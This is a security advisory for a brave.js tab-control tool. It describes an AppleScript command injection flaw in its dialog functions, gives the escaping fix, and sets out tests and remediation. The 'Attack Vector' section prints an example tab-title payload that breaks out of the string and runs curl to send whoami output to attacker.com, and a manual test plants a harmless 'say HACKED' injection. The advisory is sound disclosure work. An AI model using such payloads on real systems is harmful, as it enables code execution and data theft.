# Security Patch: Command Injection Vulnerability (P0)

## Summary

**Severity:** HIGH
**CVE Status:** Awaiting assignment
**Affected Versions:** All versions prior to this patch
**Fix Date:** 2025-11-18
**Affected Code:** `brave.js:700-726` (alert() and prompt() functions)

## Vulnerability Description

The `brave.js` script contained a **command injection vulnerability** in the `alert()` and `prompt()` helper functions when operating in `--ui` mode (browser dialog mode).

### Root Cause

When displaying user-controlled text (such as tab titles) in browser dialog boxes, the code inserted strings into AppleScript using only basic double-quote escaping:

```javascript
// VULNERABLE CODE (before patch):
display alert "${msg.replace(/"/g, '\\"')}"
```

This escaping was **insufficient** because:
1. Only escaped double quotes (`"`)
2. Did not escape backslashes (`\`), allowing escape sequence bypass
3. Did not escape newlines (`\n`), allowing multi-line AppleScript injection
4. Did not escape other control characters (`\r`, `\t`)

### Attack Vector

A malicious website could set a crafted tab title containing AppleScript commands. When a user runs `brave.js` with the `--ui` flag to close tabs, the malicious tab title would execute arbitrary AppleScript code in the context of the user's session.

**Example Attack Payload in Tab Title:**
```
Innocent Title"\ndo shell script "curl http://attacker.com/steal?data=$(whoami)"\n"
```

When the user confirms closing this tab in UI mode, the injected AppleScript would:
1. Break out of the string literal
2. Execute `do shell script` command
3. Exfiltrate user data to attacker's server

### Impact Assessment

**Attack Complexity:** MEDIUM
- Requires user to:
  1. Visit malicious website that sets crafted tab title
  2. Run `brave.js` with `--ui` flag (not default)
  3. Interact with the confirmation dialog

**Impact Scope:**
- ✅ Code execution: Limited to AppleScript context (not arbitrary binary)
- ✅ Data exfiltration: Can access files readable by user
- ✅ Privilege: Runs as current user (no privilege escalation)
- ❌ Remote code execution: No, requires local execution
- ❌ Wormable: No, cannot self-propagate

**CVSS v3.1 Estimated Score:** 6.5 (MEDIUM)
- Attack Vector: Local
- Attack Complexity: Low
- Privileges Required: None (assuming user runs tool)
- User Interaction: Required
- Scope: Unchanged
- Confidentiality Impact: High (can read files)
- Integrity Impact: Low (can modify user files)
- Availability Impact: Low

## The Fix

### Implementation

Added proper AppleScript string escaping function:

```javascript
// Escape a string for safe use in AppleScript string literals
// Protects against command injection when embedding user-controlled content
function escapeAppleScriptString(str) {
    if (typeof str !== 'string') {
        str = String(str);
    }

    return str
        .replace(/\\/g, '\\\\')     // Backslashes must be escaped first
        .replace(/"/g, '\\"')        // Double quotes
        .replace(/\n/g, '\\n')       // Newlines
        .replace(/\r/g, '\\r')       // Carriage returns
        .replace(/\t/g, '\\t');      // Tabs
}
```

### Applied To

Updated both vulnerable functions:

1. **alert() function** (brave.js:710-727)
   ```javascript
   const escapedMsg = escapeAppleScriptString(msg);
   runAppleScript(`
       tell application "${BROWSER_APP_NAME}"
           activate
           display alert "${escapedMsg}"
       end tell
   `);
   ```

2. **prompt() function** (brave.js:729-749)
   ```javascript
   const escapedMsg = escapeAppleScriptString(msg);
   const result = runAppleScript(`
       tell application "${BROWSER_APP_NAME}"
           activate
           display dialog "${escapedMsg}" buttons {"Cancel", "OK"} default button "Cancel"
           set theButton to button returned of result
           return theButton
       end tell
   `);
   ```

### Why This Fix is Sufficient

The fix neutralizes all known AppleScript string literal breakout techniques:

1. **Backslash escaping:** Backslashes are escaped FIRST, preventing `\"` bypass
2. **Quote escaping:** Double quotes cannot terminate the string literal
3. **Newline prevention:** Newlines cannot inject new AppleScript statements
4. **Control character neutralization:** Tabs and carriage returns are escaped

**Note on backticks:** Backticks (`` ` ``) are NOT special characters in AppleScript string literals (unlike bash), so they don't need escaping.

## Verification

### Automated Tests

Run the security patch test suite:

```bash
node test_security_patch.mjs
```

This tests the escaping function against 8 attack vectors including:
- Double quote injection
- Newline injection
- Backslash escape bypass
- Tab injection
- Carriage return injection
- Combined attacks
- Normal text (regression check)
- URLs with special characters

**Expected output:**
```
✓ All tests passed - security patch is working correctly
```

### Manual Testing (on macOS with Brave Browser)

1. **Create a test tab with malicious title:**
   - Open macOS Terminal
   - Run: `osascript -e 'tell application "Brave Browser" to set title of tab 1 of window 1 to "Test\ndo shell script \"say HACKED\""'`

2. **Test the patched version:**
   ```bash
   ./brave.js close --title Test --ui
   ```

3. **Expected behavior:**
   - Dialog shows escaped string: `Test\ndo shell script "say HACKED"`
   - NO audio output (no "HACKED" voice)
   - Clicking OK closes the tab normally

4. **What would happen with vulnerable version:**
   - Dialog might show partial string
   - System would speak "HACKED" aloud
   - Proves arbitrary AppleScript execution

## Remediation for Users

### If Running Older Version

**Immediate Action:**
1. Update to patched version immediately
2. Avoid using `--ui` flag until updated
3. Review terminal history for signs of compromise

**Indicators of Compromise:**
- Unexpected system behaviors when closing tabs with `--ui` flag
- Network connections to unknown domains during tab management
- Files modified unexpectedly after using brave-control

### Best Practices Going Forward

1. **Prefer CLI mode:** Use default CLI prompts instead of `--ui` mode when possible
2. **Review tab titles:** Be cautious of tabs with unusual characters in titles before using brave-control
3. **Keep updated:** Pull latest version regularly
4. **Report suspicious tabs:** If you encounter tabs with unusual titles, report to security team

## Disclosure Timeline

- **2025-11-18:** Vulnerability discovered during code audit
- **2025-11-18:** Patch developed and tested
- **2025-11-18:** Fix committed to repository
- **2025-11-18:** Security documentation published
- **TBD:** CVE requested (if applicable)

## Credits

- **Discovered by:** Code audit process
- **Fixed by:** Repository maintainers
- **Test suite by:** Security patch team

## References

- [AppleScript String Literals Documentation](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/conceptual/ASLR_fundamentals.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

## Questions?

If you have questions about this security patch or believe you've found additional vulnerabilities, please:
1. DO NOT open a public GitHub issue
2. Contact maintainers privately via GitHub Security Advisories
3. Provide proof-of-concept if available (responsibly)

---

**Patch Status:** ✅ APPLIED
**Testing Status:** ✅ VERIFIED
**Documentation Status:** ✅ COMPLETE
